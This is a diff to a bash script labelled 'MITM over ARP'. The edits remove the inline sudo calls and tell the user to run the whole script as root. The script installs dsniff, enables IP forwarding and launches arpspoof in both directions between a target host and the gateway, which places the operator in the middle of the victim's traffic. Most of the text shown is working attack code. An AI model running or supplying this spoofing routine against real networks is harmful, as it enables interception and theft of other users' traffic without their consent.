@@ -17,7 +17,7 @@ script_name=$0
 
 #check for empty parameters 
 #if [ $# -ne 1 ]; then
-#	echo -e "${BOLD}${GREEN}[+] Usage :$0 -o <> -t<> -i <interface> ${NONE}"
+#	echo -e "${BOLD}${GREEN}[+] Usage :sudo $script_name -o <> -t<> -i <interface> ${NONE}"
 #	exit
 #fi
 echo -e "${BOLD}${GREEN}MITM over ARP ${NONE}"
@@ -28,7 +28,7 @@ while test $# -gt 0; do
 				-h|--help)
 				      echo -e "${BOLD}$script_name - MITM over ARP ${NONE}"
 				      echo " "
-				      echo "$script_name [options] [arguments]"
+				      echo "sudo $script_name [options] [arguments]"
 				      echo " "
 				      echo "[+] Options:"
 				      echo "	-h, --help                show brief help"
@@ -64,31 +64,31 @@ pth=""
 pth=$(which dsniff)
 if [ -z "$pth" ]
 then
-	sudo apt install dsniff
+	apt install dsniff
 fi
 
 pth=""
 pth=$(which parallel)
 if [ -z "$pth" ]
 then
-	sudo apt install parallel
+	apt install parallel
 fi
 
 pth=""
 pth=$(which xterm)
 if [ -z "$pth" ]
 then
-	sudo apt install xterm
+	apt install xterm
 fi
 
 
 #Enable IP forwading
-sudo sysctl -w net.ipv4.ip_forward=1
+sysctl -w net.ipv4.ip_forward=1
 if [[ -z "$ori_ip" || -z "spoof_ip" || -z "$inter" ]]
 then
      echo -e "${BOLD}$script_name - MITM over ARP ${NONE}"
      echo " "
-     echo "$script_name [options] [arguments]"
+     echo "sudo $script_name [options] [arguments]"
      echo " "
      echo "[+] Options:"
      echo "	-h, --help                show brief help"
@@ -103,6 +103,6 @@ echo -e "${YELLOW}[+] IP of Gateway : $spoof_ip${NONE}";
 echo -e "${CYAN}[+]Interface       : $inter${NONE}"
 
 echo -e "${GREEN}[+] Telling $ori_ip that I am $spoof_ip ${NONE}"
-xterm -e sudo $(which arpspoof) -i $inter -t $ori_ip $spoof_ip &
+xterm -e $(which arpspoof) -i $inter -t $ori_ip $spoof_ip &
 echo -e "${RED}[+] Telling $spoof_ip that I am $ori_ip ${NONE}"
-xterm -e sudo $(which arpspoof) -i $inter -t $spoof_ip $ori_ip
+xterm -e $(which arpspoof) -i $inter -t $spoof_ip $ori_ip
